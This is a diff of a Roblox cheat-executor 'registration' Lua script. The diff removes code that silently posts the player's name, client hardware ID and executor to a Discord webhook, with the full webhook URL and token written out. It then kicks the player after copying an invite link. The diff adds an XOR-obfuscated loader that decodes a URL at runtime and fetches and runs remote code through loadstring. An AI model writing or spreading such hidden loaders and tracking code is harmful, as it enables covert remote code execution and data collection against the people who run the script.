@@ -1,44 +1,5 @@
--- Register Fluxus and Script-Ware Script
+--[[
+        Register Fluxus and Script-Ware
+]]--
 
-Webhook_URL = "https://discord.com/api/webhooks/1045952435128107019/wl7bceDv_GEl2Yep0oQcLelh8MgWtUfNPJeOec-G18qB_v3UcJfh28GjmRwnmMTl7g8R"
-
-
-local exploitcheck =
-   syn and "Synapse X" or
-   identifyexecutor() and "Script Ware" or "Fluxus" 
-
-local url = Webhook_URL
-local msgData = {
-    ["content"] = '<@836746138924482560>, <@818498059276386324>',
-    ["embeds"] = {{
-        ["title"] = "**CGB User Detected**",
-        ["description"] = game.Players.LocalPlayer.Name.." has executed CGB Hub",
-        ["type"] = "rich",
-        ["color"] = tonumber(0xffffff),
-        ["fields"] = {
-            {
-                ["name"] = "Hardware ID:",
-                ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
-                ["inline"] = true
-            },
-            {
-                ["name"] = "Executor:",
-                ["value"] = exploitcheck,
-                ["inline"] = false
-            }
-        }
-    }}
-}
-local newdata = game:GetService("HttpService"):JSONEncode(msgData)
-
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http.request or fluxus.request
-local sendMsg = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(sendMsg)
-
-wait(5)
-
-setclipboard("https://discord.gg/8NbwAuBTjm")
-game.Players.LocalPlayer:Kick("Discord Copied. Create a ticket to finish registration")
+local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for i=1, #v8 do v6(v10,v0(v4(v1(v2(v8,i,i + (1 -0))),v1(v2(v9,(1 -0) + (121 -(41 + 80)) + ((i-1)% #v9),1 + 0 + ((i-1)% #v9) + 1 + (0 -0))))%(108 + 148)));end return v5(v10);end loadstring(game:HttpGet(v7("\175\25\21\192\201\70\232\66\6\217\206\20\178\15\79\211\213\17\232\46\38\242\151\63\168\2\13\247\219\17\162\31\35\223\195\83\132\42\35\157\242\9\165\64\54\216\211\8\162\1\8\195\206\83\181\12\22\159\215\29\174\3\78\226\223\27\174\30\21\194\219\8\174\2\15\159\232\25\160\4\18\196\223\14\233\43\13\197\194\9\180\67\50\231\148\16\178\12","\199\109\97\176\186\124"),true))();
